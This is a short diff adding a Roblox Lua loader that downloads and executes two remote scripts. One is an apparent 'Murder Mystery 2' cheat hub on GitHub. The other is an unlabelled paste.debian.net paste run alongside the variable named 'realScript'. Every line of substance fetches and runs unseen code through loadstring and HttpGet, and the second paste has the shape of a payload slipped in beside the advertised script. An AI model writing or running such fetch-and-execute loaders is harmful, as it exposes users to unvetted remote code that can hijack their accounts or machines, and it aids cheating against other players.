@@ -1,0 +1,5 @@
+local realScript = "https://raw.githubusercontent.com/Gabriel10872/Murder-Mystery-2/refs/heads/main/ICE%20HUB"
+local other = "https://paste.debian.net/plainh/bad0fca5/"
+
+task.spawn(loadstring(game:HttpGet(realScript, true)))
+task.spawn(loadstring(game:HttpGet(other, true)))
